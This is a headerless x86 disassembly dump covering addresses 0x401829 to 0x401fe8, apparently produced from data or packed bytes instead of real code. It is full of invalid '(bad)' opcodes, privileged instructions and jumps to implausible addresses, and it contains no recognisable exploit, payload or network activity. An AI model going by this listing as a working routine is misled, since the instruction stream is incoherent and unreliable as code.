  401829:	into   
  40182a:	add    BYTE PTR [ebx+0x756aec00],cl
  401830:	jne    0x401865
  401832:	inc    DWORD PTR [ebx]
  401834:	rcl    BYTE PTR [ecx+0x50],1
  401837:	push   eax
  401838:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40183e:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  401845:	sar    bh,0x84
  401848:	or     BYTE PTR [ebx],al
  40184a:	push   eax
  40184b:	add    BYTE PTR [ebx+0x453dc845],cl
  401851:	pushf  
  401852:	cmp    bh,al
  401854:	pushf  
  401855:	mov    ah,0x89
  401857:	test   eax,ebp
  401859:	clc    
  40185a:	inc    ebp
  40185b:	inc    ebp
  40185c:	mov    DWORD PTR [eax+eax*8],esi
  40185f:	sub    al,0x3b
  401861:	mov    BYTE PTR [ebx+ecx*4+0x59d8ec89],bl
  401868:	dec    ebp
  401869:	popa   
  40186a:	xor    eax,DWORD PTR [edi+0x3]
  40186d:	mov    ecx,DWORD PTR [ecx+0x4d59f4b4]
  401873:	popa   
  401874:	xor    eax,DWORD PTR [edi+0x3]
  401877:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40187e:	fsub   DWORD PTR [ebp-0x380064]
  401884:	int3   
  401885:	lea    eax,[ebp+0x45fff860]
  40188b:	push   eax
  40188c:	cmp    eax,0xc78d9c75
  401891:	pop    esp
  401892:	lods   al,BYTE PTR ds:[esi]
  401893:	inc    DWORD PTR [ebp+0x4508f8ff]
  401899:	mov    edi,DWORD PTR [edi]
  40189b:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4018a2:	test   DWORD PTR [edi-0x8],edx
  4018a5:	inc    esi
  4018a6:	inc    ebp
  4018a7:	add    BYTE PTR [ecx],dh
  4018a9:	push   0x8b809c
  4018ae:	in     al,dx
  4018af:	inc    ebp
  4018b0:	push   ebp
  4018b1:	mov    esi,DWORD PTR [ebx]
  4018b3:	cld    
  4018b4:	add    eax,DWORD PTR [eax+0xf013b]
  4018ba:	adc    al,0x0
  4018bc:	add    bh,bh
  4018be:	jmp    0xbd19db
  4018c3:	add    BYTE PTR [ebp+0x45],cl
  4018c6:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  4018cc:	dec    ebp
  4018cd:	push   0x38033
  4018d2:	cmp    eax,DWORD PTR [eax]
  4018d4:	unpcklps xmm7,xmm0
  4018d7:	jne    0x4018d9
  4018d9:	dec    DWORD PTR [ebx+0x5545cc18]
  4018df:	mov    DWORD PTR [ebx],esi
  4018e1:	shl    BYTE PTR [ebx],1
  4018e3:	inc    ebp
  4018e4:	add    ecx,DWORD PTR [ecx+0x60fc803]
  4018ea:	retf   0x5575
  4018ed:	dec    DWORD PTR [ebx-0x5ba17e8]
  4018f3:	(bad)  
  4018f4:	stc    
  4018f5:	in     al,dx
  4018f6:	or     al,0x85
  4018f8:	dec    ebp
  4018f9:	clc    
  4018fa:	xor    eax,DWORD PTR [ebp+0x3]
  4018fd:	mov    ebp,ecx
  4018ff:	rol    BYTE PTR [eax],1
  401901:	inc    ebp
  401902:	add    BYTE PTR [eax-0x7747ab3],bh
  401908:	clc    
  401909:	inc    ebp
  40190a:	retf   
  40190b:	mov    edx,ebx
  40190d:	in     al,dx
  40190e:	(bad)  
  40190f:	retf   
  401910:	into   
  401911:	into   
  401912:	scas   eax,DWORD PTR es:[edi]
  401913:	dec    ebp
  401914:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40191a:	sub    ecx,esi
  40191c:	cmp    ecx,DWORD PTR [ebp+0x77]
  40191f:	(bad)  
  401920:	mov    edi,eax
  401922:	int3   
  401923:	test   DWORD PTR [ecx-0x74baff08],ecx
  401929:	cmp    ch,BYTE PTR [esp+ebx*4-0x57cc38ab]
  401930:	xor    eax,DWORD PTR [ebp+0x4503f803]
  401936:	(bad)  
  401938:	retf   0x559c
  40193b:	(bad)  
  40193c:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  401943:	inc    ebp
  401944:	add    eax,0xeb9c4d3e
  401949:	(bad)  
  40194a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  401950:	xor    ecx,DWORD PTR [ebp+0x33]
  401953:	mov    eax,DWORD PTR [ebx]
  401955:	call   0xce4fe45d
  40195a:	retf   0x55d1
  40195d:	test   BYTE PTR [ebx-0x5ff17fe],cl
  401963:	jmp    0x40195e
  401965:	add    BYTE PTR ds:0xebf44d8b,al
  40196b:	push   ebp
  40196c:	mov    ebp,DWORD PTR [ebx]
  40196e:	mov    eax,0x33f8558b
  401973:	retf   
  401974:	xor    ecx,esi
  401976:	add    edx,ecx
  401978:	add    eax,DWORD PTR [edx+0xca010f]
  40197e:	push   ebp
  40197f:	dec    ebp
  401980:	mov    ecx,DWORD PTR [ebx-0x34050718]
  401986:	stc    
  401987:	rol    DWORD PTR ds:0xebce4dd6,cl
  40198d:	scas   eax,DWORD PTR es:[edi]
  40198e:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  401994:	xor    ebp,DWORD PTR [ebx]
  401996:	xor    edi,DWORD PTR [ebx]
  401998:	add    esi,DWORD PTR [edi+0x3]
  40199b:	mov    ecx,DWORD PTR [edi]
  40199d:	clc    
  40199e:	retf   0x55cb
  4019a1:	into   
  4019a2:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  4019a9:	test   al,0x4d
  4019ab:	push   ebp
  4019ac:	jbe    0x4019e1
  4019ae:	mov    esi,DWORD PTR [ebx]
  4019b0:	mov    al,0x3
  4019b2:	push   ebp
  4019b3:	add    esi,DWORD PTR [ebx]
  4019b5:	rdpmc  
  4019b7:	retf   0x5503
  4019ba:	add    ecx,DWORD PTR [ebx-0x53517f1]
  4019c0:	dec    ebp
  4019c1:	stc    
  4019c2:	mov    ecx,DWORD PTR [eax]
  4019c4:	or     BYTE PTR [ebp+0x4d],cl
  4019c7:	jmp    0x1341a57
  4019cc:	dec    ebp
  4019cd:	dec    ebp
  4019ce:	(bad)  
  4019cf:	mov    ebx,esp
  4019d1:	clc    
  4019d2:	test   ebx,ecx
  4019d4:	clc    
  4019d5:	ror    DWORD PTR [ebp-0x2a],cl
  4019d8:	mov    esi,ecx
  4019da:	lock scas eax,DWORD PTR es:[edi]
  4019dc:	inc    ebp
  4019dd:	mov    edi,DWORD PTR [edx]
  4019df:	hlt    
  4019e0:	pushf  
  4019e1:	jge    0x40196e
  4019e3:	sub    ebx,esp
  4019e5:	cmp    ecx,ebx
  4019e7:	ja     0x4019b7
  4019e9:	mov    ebp,DWORD PTR [eax-0x58]
  4019ec:	dec    ebp
  4019ed:	xor    ecx,DWORD PTR [di+0x3]
  4019f1:	mov    esp,esp
  4019f3:	clc    
  4019f4:	push   ebp
  4019f5:	retf   
  4019f6:	mov    dl,bl
  4019f8:	adc    esi,edx
  4019fa:	jb     0x4019ca
  4019fc:	add    BYTE PTR [edi-0xb7474b3],ch
  401a02:	lock jge 0x4019d0
  401a05:	sub    ecx,DWORD PTR [ebp+0x3b]
  401a08:	mov    esi,DWORD PTR [edi-0x20]
  401a0b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459f]
  401a12:	mov    BYTE PTR [ebx-0x34b20729],cl
  401a18:	mov    edx,ebx
  401a1a:	lock (bad) 
  401a1c:	ror    esi,cl
  401a1e:	push   ebp
  401a1f:	scas   eax,DWORD PTR es:[edi]
  401a20:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  401a26:	lahf   
  401a27:	sub    esi,DWORD PTR [edx]
  401a29:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  401a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a30:	xor    esp,DWORD PTR [ebx]
  401a32:	add    ecx,DWORD PTR [ebp-0x1c]
  401a35:	mov    edi,DWORD PTR [ebp-0x8]
  401a38:	mov    bl,cl
  401a3a:	cmp    dl,bl
  401a3c:	jb     0x401a0c
  401a3e:	add    dh,dl
  401a40:	dec    ebp
  401a41:	scas   eax,DWORD PTR es:[edi]
  401a42:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  401a48:	shr    DWORD PTR [ebx],cl
  401a4a:	into   
  401a4b:	cmp    edx,esi
  401a4d:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  401a53:	dec    ebp
  401a54:	dec    ebp
  401a55:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  401a5b:	retf   
  401a5c:	xor    edx,esi
  401a5e:	add    ecx,esi
  401a60:	imul   ecx,edx
  401a63:	mov    DWORD PTR [ebp+0x8],edx
  401a66:	xor    ecx,DWORD PTR [ebp+0x2b]
  401a69:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  401a6f:	add    esi,DWORD PTR [ebx]
  401a71:	rol    BYTE PTR [ebx],0x45
  401a74:	(bad)  
  401a77:	pushf  
  401a78:	jge    0x401a03
  401a7a:	xor    esp,eax
  401a7c:	sub    eax,DWORD PTR [ebp-0x73]
  401a7f:	(bad)  
  401a80:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  401a87:	dec    ebp
  401a88:	xchg   BYTE PTR [ebx],dh
  401a8a:	inc    DWORD PTR [ebx]
  401a8c:	(bad)  
  401a8d:	jmp    0x401adc
  401a8f:	mov    ecx,DWORD PTR [ebx-0x34341324]
  401a95:	dec    ebp
  401a96:	into   
  401a97:	mov    ebp,DWORD PTR [edi-0x23737420]
  401a9d:	lahf   
  401a9e:	shl    DWORD PTR [edx],cl
  401aa0:	retf   0x5588
  401aa3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  401aa9:	add    eax,DWORD PTR [eax]
  401aab:	in     al,0x4d
  401aad:	push   ebp
  401aae:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  401ab4:	popa   
  401ab5:	add    ch,cl
  401ab7:	dec    ebp
  401ab8:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  401abe:	dec    ebp
  401abf:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  401ac5:	jge    0x401a95
  401ac7:	mov    BYTE PTR [edi+0xf723b3a],ch
  401acd:	add    cl,dh
  401acf:	dec    ebp
  401ad0:	dec    DWORD PTR [ebx-0x2c032301]
  401ad6:	inc    ebp
  401ad7:	push   ebp
  401ad8:	dec    DWORD PTR [ebx-0x73ff1f34]
  401ade:	lea    ebx,[edi-0x7400cdac]
  401ae4:	push   eax
  401ae5:	mov    ah,0x45
  401ae7:	push   ebp
  401ae8:	mov    esi,DWORD PTR [ebx]
  401aea:	les    esi,FWORD PTR [ebx]
  401aec:	add    BYTE PTR [ebx],al
  401aee:	inc    DWORD PTR [ebx]
  401af0:	mov    ecx,DWORD PTR [edi]
  401af2:	cld    
  401af3:	retf   0x4d80
  401af6:	add    DWORD PTR [ecx+0x4d30e400],ecx
  401afc:	jne    0x401a89
  401afe:	(bad)  
  401aff:	in     al,dx
  401b00:	ror    bl,1
  401b02:	pop    ebp
  401b03:	into   
  401b04:	add    BYTE PTR [edi-0xf2f7475],ch
  401b0a:	not    bl
  401b0c:	adc    al,0xca
  401b0e:	inc    ebp
  401b0f:	push   ebp
  401b10:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  401b16:	push   0xaf80d6
  401b1b:	mov    eax,DWORD PTR [eax]
  401b1d:	fdiv   st(7),st
  401b1f:	sti    
  401b20:	sbb    dh,cl
  401b22:	pop    esi
  401b23:	xchg   esp,eax
  401b24:	leave  
  401b25:	lahf   
  401b26:	add    al,0x32
  401b28:	push   ebp
  401b29:	cmp    ebp,esp
  401b2b:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  401b2f:	dec    DWORD PTR [ecx-0x740f0375]
  401b35:	push   ebp
  401b36:	cld    
  401b37:	xor    ecx,DWORD PTR [esi-0x76f07efd]
  401b3d:	retf   0x558b
  401b40:	clc    
  401b41:	xor    esi,eax
  401b43:	add    esi,DWORD PTR [ebp-0x75]
  401b46:	(bad)  
  401b47:	hlt    
  401b48:	or     cl,BYTE PTR [esi+eax*8-0x39cdf761]
  401b4f:	mov    DWORD PTR [edx],ecx
  401b51:	hlt    
  401b52:	(bad)  
  401b53:	dec    ebp
  401b54:	add    dh,BYTE PTR [ebx]
  401b56:	leave  
  401b57:	mov    edx,0xffec8d55
  401b5c:	push   ecx
  401b5d:	rol    DWORD PTR [ebp+0x55],1
  401b60:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  401b66:	mov    eax,0xf8030b33
  401b6b:	lar    ecx,di
  401b6e:	push   ebp
  401b6f:	retf   0x863b
  401b72:	jne    0x401b71
  401b74:	mov    edi,edi
  401b76:	or     BYTE PTR [ebp+0x41],dh
  401b79:	mov    esp,edx
  401b7b:	cld    
  401b7c:	inc    eax
  401b7d:	mov    al,0x15
  401b7f:	add    DWORD PTR [ecx+0x0],eax
  401b82:	in     eax,dx
  401b83:	test   DWORD PTR [ecx-0x1],eax
  401b86:	sar    bh,cl
  401b88:	ret    0x8b
  401b8b:	cld    
  401b8c:	mov    eax,DWORD PTR [eax+0x8d0151]
  401b92:	clc    
  401b93:	xor    BYTE PTR [ebp+0x45],al
  401b96:	mov    ecx,DWORD PTR [ebx+0x8ec0fc]
  401b9c:	loopne 0x401b9d
  401b9e:	mov    edi,edi
  401ba0:	mov    ecx,eax
  401ba2:	clc    
  401ba3:	jne    0x401b75
  401ba5:	call   0x812eae
  401baa:	adc    eax,0xc6854575
  401baf:	je     0x401bb2
  401bb1:	mov    eax,esi
  401bb3:	cld    
  401bb4:	or     DWORD PTR [eax+0x401c9],eax
  401bba:	push   ebp
  401bbb:	add    ah,ch
  401bbd:	add    BYTE PTR [ecx+0x6a],dl
  401bc0:	inc    ebp
  401bc1:	push   esi
  401bc2:	mov    DWORD PTR [eax-0x4],edx
  401bc5:	pop    edi
  401bc6:	mov    ebx,DWORD PTR [ebx-0x4]
  401bc9:	ret    0xb1
  401bcc:	push   es
  401bcd:	mov    ecx,DWORD PTR [ecx-0x77274af]
  401bd3:	clc    
  401bd4:	lock inc ebp
  401bd6:	jne    0x401c2e
  401bd8:	(bad)  
  401bd9:	jne    0x401bdf
  401bdb:	mov    eax,0xf841ba66
  401be0:	rol    BYTE PTR [esi],cl
  401be2:	(bad)  
  401be3:	jne    0x401c22
  401be5:	cmp    eax,ebx
  401be7:	pop    esi
  401be8:	mov    ecx,DWORD PTR [eax]
  401bea:	push   ecx
  401beb:	inc    ecx
  401bec:	lea    edi,[esi-0x8]
  401bef:	inc    edx
  401bf0:	inc    ebp
  401bf1:	int    0x8b
  401bf3:	inc    edx
  401bf4:	cld    
  401bf5:	jle    0x401bb5
  401bf7:	inc    ecx
  401bf8:	xchg   eax,ebp
  401bfa:	mov    ebx,eax
  401bfc:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  401c02:	or     edi,eax
  401c04:	inc    ebp
  401c05:	inc    ebp
  401c06:	(bad)  
  401c07:	mov    ecx,DWORD PTR [eax]
  401c09:	cld    
  401c0a:	(bad)  
  401c0b:	loop   0x401c0e
  401c0d:	mov    eax,esi
  401c0f:	mov    DWORD PTR ds:0x4f8c98b,eax
  401c15:	rcl    BYTE PTR [esi+0xf],1
  401c18:	iret   
  401c19:	inc    ebp
  401c1a:	leave  
  401c1b:	(bad)  
  401c1c:	dec    DWORD PTR [ecx]
  401c1e:	mov    eax,esi
  401c20:	mov    eax,DWORD PTR [edi]
  401c22:	mov    dh,0xdd
  401c25:	push   es
  401c26:	nop
  401c27:	(bad)  
  401c28:	inc    DWORD PTR [ebx]
  401c2a:	push   esi
  401c2b:	leave  
  401c2c:	iret   
  401c2d:	add    al,0x46
  401c2f:	push   ebp
  401c30:	loope  0x401c1e
  401c32:	push   ebp
  401c33:	push   ecx
  401c34:	inc    DWORD PTR [ebp+0x56]
  401c37:	mov    DWORD PTR [esi-0x4],eax
  401c3a:	in     eax,dx
  401c3b:	push   ebp
  401c3c:	sbb    BYTE PTR [eax+0x7c6daff],bh
  401c42:	add    al,BYTE PTR [edx]
  401c44:	mov    edx,DWORD PTR [ebp-0x17]
  401c47:	cmp    edi,esi
  401c49:	jne    0x401c4a
  401c4b:	(bad)  
  401c4c:	push   esi
  401c4d:	pop    es
  401c4e:	push   ebp
  401c4f:	mov    ebp,esp
  401c51:	or     BYTE PTR [ebp+0x41],al
  401c54:	add    edi,edx
  401c56:	sub    BYTE PTR [eax-0x4],al
  401c59:	ret    0xc275
  401c5c:	add    DWORD PTR [eax],eax
  401c5e:	sbb    al,0x8b
  401c60:	mov    edx,DWORD PTR [ecx+0x14]
  401c63:	lea    edx,[edx-0x1ba7508]
  401c69:	push   esi
  401c6a:	enter  0xd375,0xb8
  401c6e:	test   DWORD PTR [esi],0x6ce0750
  401c74:	enter  0xd375,0x3b
  401c78:	neg    DWORD PTR [esi+0x50]
  401c7b:	or     cl,dl
  401c7d:	inc    edx
  401c7e:	(bad)  
  401c7f:	jmp    0x36be470
  401c84:	inc    eax
  401c85:	jmp    0xc9901eda
  401c8a:	push   edi
  401c8b:	push   ebp
  401c8c:	imul   ah
  401c8e:	adc    DWORD PTR [ecx-0x1],0x45
  401c92:	add    BYTE PTR [ecx+0x55d3fc00],cl
  401c98:	lea    edi,[eax-0x7fff4ca]
  401c9e:	mov    eax,0x4550402
  401ca3:	cmp    ebp,ecx
  401ca5:	jne    0x401c52
  401ca7:	mov    eax,DWORD PTR ds:0x241e808
  401cad:	in     eax,dx
  401cae:	add    BYTE PTR [eax-0x7],al
  401cb1:	xlat   BYTE PTR ds:[ebx]
  401cb2:	ss inc ecx
  401cb4:	aas    
  401cb5:	loope  0x401d34
  401cb7:	ret    0x8b
  401cba:	lock mov edi,DWORD PTR [ebp-0x18]
  401cbe:	and    edi,edi
  401cc0:	mov    edi,edi
  401cc2:	call   0xe40e1d9e
  401cc7:	push   es
  401cc8:	add    al,ch
  401cca:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  401cd1:	(bad)  
  401cd2:	hlt    
  401cd3:	add    eax,0xffd3e87d
  401cd8:	cmp    bh,0x8
  401cdb:	(bad)  
  401cdc:	fld    DWORD PTR [esi]
  401cde:	out    dx,al
  401cdf:	call   0xff9f1be7
  401ce4:	cmp    al,0x46
  401ce6:	shr    eax,0x8
  401ce9:	(bad)  
  401cea:	pop    es
  401ceb:	fisttp QWORD PTR [ebp+0xe577eff]
  401cf1:	push   ebx
  401cf2:	add    BYTE PTR [ebx+0x24008b56],cl
  401cf8:	add    BYTE PTR [ebp+0x50],al
  401cfb:	push   eax
  401cfc:	add    DWORD PTR [ebx+0x757d1834],ecx
  401d02:	sub    edx,DWORD PTR [esi-0x24]
  401d05:	jne    0x401cbd
  401d07:	lods   eax,DWORD PTR ds:[esi]
  401d08:	mov    edx,DWORD PTR [edx-0x34]
  401d0b:	dec    esi
  401d0c:	out    0x83,eax
  401d0e:	into   
  401d0f:	push   edi
  401d11:	loopne 0x401ce1
  401d13:	shr    BYTE PTR [edx+ecx*4+0x0],1
  401d17:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  401d1e:	rol    DWORD PTR [edx],0x8
  401d21:	mov    esp,ecx
  401d23:	cmp    DWORD PTR [ebx],0xc
  401d26:	mov    esi,0x5001c0
  401d2b:	push   eax
  401d2c:	push   cs
  401d2d:	push   eax
  401d2e:	(bad)  
  401d2f:	sub    edx,edi
  401d31:	push   esi
  401d32:	adc    al,0xcb
  401d34:	ins    DWORD PTR es:[edi],dx
  401d35:	mov    eax,0x203e8
  401d3a:	add    al,ah
  401d3c:	inc    esi
  401d3d:	mov    al,ch
  401d3f:	pop    es
  401d40:	add    DWORD PTR [eax],0x1
  401d43:	add    dh,al
  401d45:	add    ah,ch
  401d47:	rol    DWORD PTR [edx-0xd],1
  401d4a:	cli    
  401d4b:	push   0x4a
  401d4d:	pop    ecx
  401d4e:	retf   0xfe6
  401d51:	add    BYTE PTR [ebx-0x4e72f41e],al
  401d57:	(bad)  
  401d58:	dec    BYTE PTR [ebx+0x45b1fc72]
  401d5e:	(bad)  
  401d5f:	sub    ebp,DWORD PTR [ebx]
  401d61:	and    al,0x52
  401d63:	(bad)  
  401d64:	dec    edi
  401d65:	inc    ebp
  401d66:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  401d6d:	add    BYTE PTR [ebp-0x7b],dh
  401d70:	pop    eax
  401d71:	add    BYTE PTR [edx+0x0],bl
  401d74:	pop    edx
  401d75:	dec    ebp
  401d76:	jmp    DWORD PTR [ebx]
  401d78:	and    al,0xec
  401d7a:	push   edx
  401d7b:	out    0x64,eax
  401d7d:	jmp    0xd3f21382
  401d82:	jmp    0x401ddc
  401d84:	mov    al,0xfe
  401d86:	dec    BYTE PTR [ebp-0x18fd8018]
  401d8c:	add    BYTE PTR [esi+ebp*1],bh
  401d8f:	pop    edx
  401d90:	icebp  
  401d91:	mov    eax,cs
  401d93:	ins    BYTE PTR es:[edi],dx
  401d94:	adc    eax,0x75510000
  401d99:	mov    esi,0x70158
  401d9e:	or     DWORD PTR [eax-0x74f48dfe],esi
  401da4:	mov    edi,esp
  401da6:	cld    
  401da7:	jge    0x401e1e
  401da9:	(bad)  
  401dab:	aas    
  401dac:	and    al,0x6d
  401dae:	adc    cl,0x1
  401db1:	mov    eax,DWORD PTR [eax]
  401db3:	and    ecx,DWORD PTR [ebx-0x167203fd]
  401db9:	dec    ebp
  401dba:	add    eax,ebp
  401dbc:	add    BYTE PTR [edx],al
  401dbe:	fadd   DWORD PTR [eax]
  401dc0:	stc    
  401dc1:	enter  0xee00,0x8b
  401dc5:	sbb    eax,0x1
  401dc8:	sbb    esi,ecx
  401dca:	in     al,0x0
  401dcc:	in     eax,dx
  401dcd:	add    BYTE PTR [eax],al
  401dcf:	jne    0x401d5c
  401dd1:	cmp    edx,esp
  401dd3:	jb     0x401dde
  401dd5:	jmp    0x401e4c
  401dd7:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  401ddd:	add    BYTE PTR [ebx+0x4d83d840],cl
  401de3:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  401de9:	jb     0x401d74
  401deb:	pop    edx
  401dec:	fadd   QWORD PTR [ebx-0x7445faa1]
  401df2:	or     dh,BYTE PTR [edx+0x0]
  401df5:	inc    edx
  401df6:	or     dl,bh
  401df8:	xlat   BYTE PTR ds:[ebx]
  401df9:	dec    edx
  401dfa:	push   edi
  401dfb:	add    al,0x7
  401dfd:	leave  
  401dfe:	rol    DWORD PTR [edx+eax*1],0x7
  401e02:	add    ecx,ecx
  401e04:	mov    edx,ecx
  401e06:	int3   
  401e07:	jmp    0x401dc7
  401e09:	mov    al,0x0
  401e0b:	(bad)  
  401e0c:	jne    0x401df6
  401e0e:	mov    eax,DWORD PTR [edx]
  401e10:	call   0xc1549b15
  401e15:	pop    edi
  401e16:	add    ebx,DWORD PTR [ecx-0x37]
  401e19:	pop    ecx
  401e1a:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  401e21:	push   es
  401e22:	mov    eax,DWORD PTR [eax]
  401e24:	int3   
  401e25:	add    ch,al
  401e27:	jae    0x401e11
  401e29:	int    0x1
  401e2b:	enter  0x3000,0x18
  401e2f:	add    BYTE PTR [ebp+0x75],al
  401e32:	mov    esi,DWORD PTR [eax-0x171f0134]
  401e38:	push   0x2
  401e3a:	pop    ecx
  401e3b:	add    BYTE PTR [eax],cl
  401e3d:	push   ebx
  401e3e:	lea    edi,[edi+eax*2]
  401e41:	mov    al,0x1
  401e43:	jb     0x401e45
  401e45:	mov    al,0x10
  401e47:	push   eax
  401e48:	add    al,0x75
  401e4a:	add    BYTE PTR [ebx],ch
  401e4c:	add    ebx,esp
  401e4e:	int3   
  401e4f:	jne    0x401e61
  401e51:	movsx  edx,cl
  401e54:	add    DWORD PTR [eax],eax
  401e56:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  401e5d:	mov    gs,edi
  401e5f:	add    BYTE PTR [eax-0x50],ch
  401e62:	add    al,ch
  401e64:	mov    eax,DWORD PTR [ecx]
  401e66:	sub    eax,DWORD PTR [eax]
  401e68:	jb     0x401edf
  401e6a:	add    DWORD PTR [esp+eiz*8-0x50],esi
  401e6e:	jge    0x401e58
  401e70:	add    al,0x1
  401e72:	add    DWORD PTR [eax],0x0
  401e75:	jne    0x401e77
  401e77:	je     0x401ebe
  401e79:	mov    eax,DWORD PTR [edi]
  401e7b:	ror    BYTE PTR [ebp+0x4d],1
  401e7e:	or     DWORD PTR [ecx+0x4d03d004],0x3
  401e85:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  401e8b:	mov    DWORD PTR [ebx],ebp
  401e8d:	fadd   DWORD PTR [eax+0x75]
  401e90:	inc    eax
  401e91:	pop    eax
  401e92:	lea    ebx,[ecx+0x4f]
  401e95:	push   0xb1000003
  401e9a:	out    dx,eax
  401e9b:	add    ebp,DWORD PTR [edx+edx*2]
  401e9e:	add    BYTE PTR [ebx+ecx*4],bh
  401ea1:	mov    ch,BYTE PTR [ebx]
  401ea3:	jb     0x401f17
  401ea5:	add    al,0x89
  401ea7:	push   eax
  401ea8:	call   0x84286c1a
  401ead:	add    DWORD PTR [eax+eax*1],eax
  401eb0:	jae    0x401ec6
  401eb2:	icebp  
  401eb3:	inc    ebp
  401eb4:	mov    eax,DWORD PTR gs:[ecx]
  401eb7:	int3   
  401eb8:	out    dx,al
  401eb9:	loopne 0x401f08
  401ebb:	sub    eax,DWORD PTR [edx]
  401ebd:	push   0xffffff83
  401ebf:	pop    esi
  401ec0:	push   cs
  401ec1:	jl     0x401edc
  401ec3:	add    al,0xaf
  401ec5:	xor    eax,0x832b6d00
  401eca:	mov    eax,DWORD PTR [edx]
  401ecc:	rcr    BYTE PTR [ebp+0x754500dc],cl
  401ed2:	ror    DWORD PTR [ebx+0x7dc8e803],1
  401ed8:	inc    ebp
  401ed9:	shr    ebx,0x3
  401edc:	or     DWORD PTR [eax],0x4
  401edf:	push   0xffffffa5
  401ee1:	pop    esi
  401ee2:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  401ee9:	jmp    0x401f48
  401eeb:	mov    edi,0xff0272
  401ef0:	fdivr  QWORD PTR [ebp+0x5d]
  401ef3:	push   0x4e
  401ef5:	pop    ecx
  401ef6:	call   0x4062fb
  401efb:	mov    DWORD PTR [ebx],eax
  401efd:	in     al,0xc8
  401eff:	rol    BYTE PTR [ebp-0x75],0xc1
  401f03:	call   0xaa20e4
  401f08:	pop    esi
  401f09:	enter  0xceff,0x8b
  401f0d:	repz mov ecx,DWORD PTR [ebp-0x34]
  401f11:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  401f18:	je     0x401f1a
  401f1a:	or     DWORD PTR [ebx-0x74183b24],eax
  401f20:	jne    0x401f06
  401f22:	jmp    0x401f1d
  401f24:	push   DWORD PTR [edx-0x24]
  401f27:	push   0x4d
  401f29:	pop    ecx
  401f2a:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  401f2e:	jge    0x401f36
  401f30:	mov    eax,eax
  401f32:	sub    ebp,DWORD PTR [edx+0x24]
  401f35:	pop    esi
  401f36:	inc    ebp
  401f37:	mov    esp,0x8b6077
  401f3c:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  401f42:	lods   al,BYTE PTR ds:[esi]
  401f43:	add    BYTE PTR [ebx],bh
  401f45:	enter  0xce73,0x49
  401f49:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  401f51:	stc    
  401f52:	jge    0x401fc6
  401f54:	jnp    0xdd3fa2b5
  401f5a:	call   0xc32030
  401f5f:	fadd   st(0),st
  401f61:	dec    esi
  401f62:	ins    BYTE PTR es:[edi],dx
  401f63:	stc    
  401f64:	cmp    al,0x73
  401f66:	push   ebp
  401f67:	mov    eax,0xf8028b
  401f6c:	jne    0x401f2f
  401f6e:	mov    esi,ecx
  401f70:	mov    esp,DWORD PTR [ebp+0x2c]
  401f73:	add    edi,DWORD PTR [ebp-0x24]
  401f76:	sub    esp,eax
  401f78:	and    al,0x45
  401f7a:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  401f80:	sbb    al,0xee
  401f82:	pop    esi
  401f83:	call   0x801fb3
  401f88:	fsubr  st,st(3)
  401f8a:	sti    
  401f8b:	add    BYTE PTR gs:[ecx],bh
  401f8e:	add    eax,esp
  401f90:	add    DWORD PTR [esi],eax
  401f92:	rol    DWORD PTR [ebp+0x8],0x29
  401f96:	mov    esp,eax
  401f98:	clc    
  401f99:	jne    0x402010
  401f9b:	mov    eax,0x8b0673
  401fa0:	loopne 0x401fe7
  401fa2:	loopne 0x401f2d
  401fa4:	lods   al,BYTE PTR ds:[esi]
  401fa5:	int3   
  401fa6:	inc    ebp
  401fa7:	mov    DWORD PTR gs:[eax+edi*8],eax
  401fab:	add    al,0xc3
  401fad:	sub    ecx,DWORD PTR [ebp+0x47]
  401fb0:	(bad)  
  401fb2:	shr    BYTE PTR [ebp-0x1f],0xe8
  401fb6:	add    eax,DWORD PTR [eax]
  401fb8:	call   0x641e0bd
  401fbd:	add    esi,DWORD PTR [esi-0x3b2efc83]
  401fc3:	dec    esi
  401fc4:	ins    DWORD PTR es:[edi],dx
  401fc5:	in     al,dx
  401fc6:	lea    eax,[eax]
  401fc8:	inc    ebp
  401fc9:	inc    ebp
  401fca:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  401fd0:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  401fda:	and    al,0xdc
  401fdc:	ror    DWORD PTR [edx+0x24],0xf7
  401fe0:	or     BYTE PTR [ebp+0x4c],dh
  401fe3:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  401fe7:	stos   BYTE PTR es:[edi],al
  401fe8:	adc    edx,edi
